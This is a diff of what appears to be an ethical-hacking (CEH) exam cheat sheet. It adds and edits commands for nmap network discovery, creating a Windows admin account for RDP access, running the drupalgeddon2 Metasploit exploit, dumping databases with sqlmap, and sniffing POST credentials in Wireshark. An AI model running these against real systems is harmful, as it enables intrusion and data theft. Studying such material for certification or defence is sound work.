@@ -11,7 +11,7 @@ If even this the above command is not working then use this command-  namp -f 10
 7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.xx.xx (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
 8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.xx.xx.xx
 9- nmap --script smb-os-discovery -p 445 <DC-IP-Address>
-10- nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.x.xx/24 to identify the number ofmercury services running
+10- nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.x.xx/24  to identify the number ofmercury services running
 11- nmap -p 3389 --open -sV 10.xx.xx.xx/24 to Identify a machine with RDP service enabled
 12- nmap -p 80,443,8080,8443,5228 --open 10.xx.xx.xx/24 or nmap -sV -p 5555 192.168.x.x/2x to identify mobile devices
 13- nmap -p 22 --open 10.xx.xx.x/24  scan for SSh 
@@ -121,7 +121,7 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
-6- http://www.cehorg.com/index.php?page_id=95
+6- http://www.xyz.com/index.php?page_id=xx 
 7- msfconsole
 search drupalgeddon2
 use exploit/unix/webapp/drupal_drupalgeddon2
@@ -166,6 +166,11 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
     sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
 8.4 shCopy code
     sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
+9.1 wapiti -u <url> -m sql
+9.2 sqlmap -u <Vulnerable url> --dbs
+9.3 sqlmap -u <Vulnerable url> -D <database name> --tables  This Will give the names of the tables
+9.4 sqlmap -u <Vulnerable url> -D <database name> -T <table name> --columns  This Will list the information aboult the columns in the selected table
+9.5 sqlmap -u <Vulnerable url> -D <database name> -T <table name> -C <columnaname> --dump   This Will Display/dump the data from the columns
 ```
 # Android
 ```
@@ -186,10 +191,12 @@ tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statis
 tcp.flags.syn == 1   (Which machine for dos)
 http.request.method == POST   (for passwords) or click tools ---> credentials
 Also
+MQTT for ioT devices
 ```
 # Find FQDN
 ```
 nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
+nmap --script smb-os-discovery -p 445 <DC-IP-Address>
 ```
 # Cracking Wi-Fi networks
 ```
